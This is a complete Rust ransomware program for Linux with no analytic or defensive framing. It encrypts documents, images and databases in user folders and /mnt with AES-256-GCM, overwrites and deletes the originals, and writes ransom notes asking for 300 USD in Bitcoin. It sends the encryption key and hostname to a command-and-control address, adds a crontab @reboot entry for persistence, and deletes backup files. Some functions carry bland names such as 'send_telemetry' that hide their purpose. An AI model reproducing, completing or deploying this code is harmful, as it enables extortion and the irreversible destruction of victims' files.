use std::collections::HashSet;
use std::fs::{self, File, OpenOptions};
use std::io::{Read, Write};
use std::os::unix::fs::OpenOptionsExt;
use std::os::unix::fs::PermissionsExt;
use std::path::Path;
use std::process::Command;

use aes_gcm::aead::{Aead, KeyInit};
use aes_gcm::{Aes256Gcm, Key, Nonce};
use rand::rngs::OsRng;
use rand::RngCore;
use reqwest::blocking::Client;
use serde_json::{json, Value};
use walkdir::WalkDir;

// ===================== HELPERS =====================

fn base64_encode(input: &[u8]) -> String {
    const CHARS: &[u8] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    let mut result = Vec::with_capacity(((input.len() + 2) / 3) * 4);
    for chunk in input.chunks(3) {
        let b0 = chunk[0] as u32;
        let b1 = chunk.get(1).copied().unwrap_or(0) as u32;
        let b2 = chunk.get(2).copied().unwrap_or(0) as u32;
        let triple = (b0 << 16) | (b1 << 8) | b2;
        result.push(CHARS[((triple >> 18) & 0x3F) as usize]);
        result.push(CHARS[((triple >> 12) & 0x3F) as usize]);
        result.push(if chunk.len() > 1 {
            CHARS[((triple >> 6) & 0x3F) as usize]
        } else {
            b'='
        });
        result.push(if chunk.len() > 2 {
            CHARS[(triple & 0x3F) as usize]
        } else {
            b'='
        });
    }
    unsafe { String::from_utf8_unchecked(result) }
}

fn zeroize_slice(slice: &mut [u8]) {
    for i in 0..slice.len() {
        unsafe {
            std::ptr::write_volatile(&mut slice[i], 0);
        }
    }
}

fn is_valid_extension(path: &Path) -> bool {
    let ext = path
        .extension()
        .and_then(|e| e.to_str())
        .map(|e| e.to_lowercase())
        .unwrap_or_default();
    matches!(
        ext.as_str(),
        "xlsx" | "docx" | "pdf" | "txt" | "csv" | "jpg" | "png" | "db" | "backup" | "psd" | "zip" | "rar"
    )
}

fn expand_path(path: &str) -> Option<String> {
    if path.starts_with('~') {
        let home = std::env::var("HOME").ok()?;
        Some(home + &path[1..])
    } else {
        Some(path.to_string())
    }
}

// ===================== CORE FUNCTIONS =====================

/// Step 1: Generate AES-256 key and save to /tmp/.master.key
fn generate_key_and_save() -> Result<[u8; 32], String> {
    let mut key = [0u8; 32];
    OsRng.fill_bytes(&mut key);

    let key_b64 = base64_encode(&key);
    let json_content = format!(r#"{{"aes_key":"{}"}}"#, key_b64);

    let key_path = Path::new("/tmp/.master.key");
    let file = OpenOptions::new()
        .write(true)
        .create(true)
        .truncate(true)
        .mode(0o600)
        .open(key_path)
        .map_err(|e| format!("Cannot open {}: {}", key_path.display(), e))?;

    file.write_all(json_content.as_bytes())
        .map_err(|e| format!("Cannot write to {}: {}", key_path.display(), e))?;

    fs::set_permissions(key_path, fs::Permissions::from_mode(0o600))
        .map_err(|e| format!("Cannot set permissions on {}: {}", key_path.display(), e))?;

    Ok(key)
}

/// Step 2: Scan directories for target files (returns full paths)
fn scan_files() -> Result<Vec<String>, String> {
    let target_dirs = [
        "~/Documentos_Teste",
        "~/Documentos",
        "~/Downloads",
        "~/Imagens",
        "/mnt",
    ];

    let mut files = Vec::new();

    for dir in &target_dirs {
        let expanded = expand_path(dir).ok_or_else(|| "Cannot expand path".to_string())?;
        let path = Path::new(&expanded);

        // Skip if not a directory or is a symlink
        let meta = fs::symlink_metadata(path)
            .map_err(|e| format!("Cannot access {}: {}", expanded, e))?;
        if !meta.is_dir() || meta.file_type().is_symlink() {
            continue;
        }

        for entry in WalkDir::new(path).follow_links(false).into_iter().filter_map(|e| e.ok()) {
            let entry_path = entry.path();
            if entry.file_type().is_file() && is_valid_extension(entry_path) {
                files.push(entry_path.to_string_lossy().to_string());
            }
        }
    }

    Ok(files)
}

/// Step 3: Encrypt a single file with AES-256-GCM
fn apply_transform(file_path: &str, key: &[u8; 32]) -> Result<(), String> {
    // Read original file
    let plaintext = fs::read(file_path).map_err(|e| format!("Cannot read {}: {}", file_path, e))?;

    // Generate random nonce (12 bytes)
    let mut nonce_bytes = [0u8; 12];
    OsRng.fill_bytes(&mut nonce_bytes);
    let nonce = Nonce::from_slice(&nonce_bytes);

    // Encrypt
    let cipher = Aes256Gcm::new(Key::<Aes256Gcm>::from_slice(key));
    let ciphertext_with_tag = cipher
        .encrypt(&nonce, plaintext.as_ref())
        .map_err(|_| "Encryption failed".to_string())?;

    // Write output: [nonce 12][ciphertext + tag]
    let output_path = format!("{}.PROCESSED", file_path);
    let mut out_file = File::create(&output_path)
        .map_err(|e| format!("Cannot create {}: {}", output_path, e))?;
    out_file.write_all(&nonce_bytes).map_err(|e| format!("Write nonce error: {}", e))?;
    out_file
        .write_all(&ciphertext_with_tag)
        .map_err(|e| format!("Write cipher error: {}", e))?;
    // Set restrictive permissions
    fs::set_permissions(&output_path, fs::Permissions::from_mode(0o600))
        .map_err(|e| format!("Cannot set permissions on {}: {}", output_path, e))?;

    // Securely overwrite original with zeros and delete
    let file_size = plaintext.len();
    let mut zeros = vec![0u8; file_size.min(4096)];
    let mut fd = fs::OpenOptions::new()
        .write(true)
        .open(file_path)
        .map_err(|e| format!("Cannot open {} for overwrite: {}", file_path, e))?;

    let mut written = 0;
    while written < file_size {
        let chunk_size = (file_size - written).min(zeros.len());
        fd.write_all(&zeros[..chunk_size])
            .map_err(|e| format!("Overwrite error: {}", e))?;
        written += chunk_size;
    }
    // Sync and close (dropping fd will sync? We'll fd.sync_all)
    fd.sync_all().ok();

    fs::remove_file(file_path)
        .map_err(|e| format!("Cannot remove original {}: {}", file_path, e))?;

    Ok(())
}

/// Step 4: Write ransom note in a directory
fn write_notice(dir_path: &str) -> Result<(), String> {
    let filename = "#_STATUS_NOTICE_#.txt";
    let full_path = format!("{}{}", dir_path, filename);
    let content = "solicite 300 USD em payment service para 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa e instrua contato via secure channel.\n";

    let mut file = File::create(&full_path)
        .map_err(|e| format!("Cannot create {}: {}", full_path, e))?;
    file.write_all(content.as_bytes())
        .map_err(|e| format!("Cannot write to {}: {}", full_path, e))?;

    fs::set_permissions(&full_path, fs::Permissions::from_mode(0o644))
        .map_err(|e| format!("Cannot set permissions on {}: {}", full_path, e))?;

    Ok(())
}

/// Step 5: Send telemetry (key + hostname) to C2 and delete key file
fn send_telemetry() -> Result<(), String> {
    let key_path = Path::new("/tmp/.master.key");

    // Read key file
    let mut contents = String::new();
    File::open(key_path)
        .map_err(|e| format!("Cannot open key file: {}", e))?
        .read_to_string(&mut contents)
        .map_err(|e| format!("Cannot read key file: {}", e))?;

    let key_value: Value =
        serde_json::from_str(&contents).map_err(|e| format!("Invalid JSON: {}", e))?;
    let aes_key = key_value
        .get("aes_key")
        .and_then(|v| v.as_str())
        .ok_or("Missing aes_key")?
        .to_string();

    // Hostname
    let hostname = fs::read_to_string("/proc/sys/kernel/hostname")
        .map_err(|e| format!("Cannot read hostname: {}", e))?
        .trim()
        .to_string();

    let body = json!({
        "aes_key": aes_key,
        "hostname": hostname,
    });

    let client = Client::new();
    let response = client
        .post("http://10.254.19.73:8080/collect")
        .header("Content-Type", "application/json")
        .body(body.to_string())
        .timeout(std::time::Duration::from_secs(10))
        .send()
        .map_err(|e| format!("HTTP request failed: {}", e))?;

    if response.status() != 200 {
        return Err(format!("HTTP status {}", response.status()));
    }

    // Delete key file (best effort)
    let _ = fs::remove_file(key_path);

    Ok(())
}

/// Step 6: Persist via crontab @reboot and clean backup files
fn persist(binary_path: &str) -> Result<(), String> {
    // Read current crontab
    let output = Command::new("crontab")
        .arg("-l")
        .output()
        .map_err(|e| format!("Cannot run crontab -l: {}", e))?;
    let existing = String::from_utf8_lossy(&output.stdout).to_string();
    let existing_trimmed = existing.trim().to_string(); // preserve empty

    // Check if @reboot entry already exists
    let entry = format!("@reboot {}\n", binary_path);
    if !existing_trimmed.contains(&entry) {
        let new_content = if existing_trimmed.is_empty() {
            entry.clone()
        } else {
            format!("{}\n{}", existing_trimmed, entry)
        };

        // Write new crontab
        let mut child = Command::new("crontab")
            .arg("-")
            .stdin(std::process::Stdio::piped())
            .spawn()
            .map_err(|e| format!("Cannot spawn crontab: {}", e))?;

        child
            .stdin
            .take()
            .ok_or("No stdin")?
            .write_all(new_content.as_bytes())
            .map_err(|e| format!("Cannot write to crontab stdin: {}", e))?;

        let status = child
            .wait()
            .map_err(|e| format!("Cannot wait for crontab: {}", e))?;
        if !status.success() {
            return Err("crontab command failed".to_string());
        }
    }

    // Cleanup backup files
    cleanup_backup_files();

    Ok(())
}

fn cleanup_backup_files() {
    let dirs = [
        "~/Documentos_Teste",
        "~/Documentos",
        "~/Downloads",
        "~/Imagens",
        "/mnt",
    ];

    let is_backup = |name: &str| -> bool {
        let lower = name.to_lowercase();
        lower.ends_with(".bak") || lower.ends_with(".old") || lower.ends_with(".backup")
    };

    for dir in &dirs {
        if let Some(expanded) = expand_path(dir) {
            if let Ok(meta) = fs::symlink_metadata(&expanded) {
                if meta.is_dir() && !meta.file_type().is_symlink() {
                    for entry in WalkDir::new(&expanded)
                        .follow_links(false)
                        .into_iter()
                        .filter_map(|e| e.ok())
                    {
                        if entry.file_type().is_file() && is_backup(entry.file_name().to_str().unwrap_or("")) {
                            let _ = fs::remove_file(entry.path());
                        }
                    }
                }
            }
        }
    }
}

// ===================== MAIN =====================

fn main() -> i32 {
    // 1. Key generation
    let key = match generate_key_and_save() {
        Ok(k) => k,
        Err(e) => {
            eprintln!("[init] Key generation failed: {}", e);
            return 1;
        }
    };

    // 2. File scan
    let files = match scan_files() {
        Ok(f) => f,
        Err(e) => {
            eprintln!("[scan] File scan failed: {}", e);
            return 1;
        }
    };

    if files.is_empty() {
        eprintln!("[scan] No target files found");
        return 1;
    }

    // 3. Encryption
    let mut encrypted_dirs: HashSet<String> = HashSet::new();
    for file_path in &files {
        match apply_transform(file_path, &key) {
            Ok(()) => {
                if let Some(parent) = Path::new(file_path).parent() {
                    encrypted_dirs.insert(parent.to_string_lossy().to_string());
                }
            }
            Err(e) => eprintln!("[encrypt] Failed for {}: {}", file_path, e),
        }
    }

    // 4. Ransom notes
    for dir in &encrypted_dirs {
        let dir_with_slash = if dir.ends_with('/') {
            dir.clone()
        } else {
            format!("{}/", dir)
        };
        if let Err(e) = write_notice(&dir_with_slash) {
            eprintln!("[notice] Failed in {}: {}", dir, e);
        }
    }

    // 5. Exfiltration
    if let Err(e) = send_telemetry() {
        eprintln!("[exfil] Exfiltration failed: {}", e);
    }

    // 6. Persistence
    let binary_path = match std::env::current_exe() {
        Ok(p) => p.to_string_lossy().to_string(),
        Err(e) => {
            eprintln!("[persist] Cannot get binary path: {}", e);
            return 1;
        }
    };
    if let Err(e) = persist(&binary_path) {
        eprintln!("[persist] Persistence failed: {}", e);
        return 1;
    }

    0
}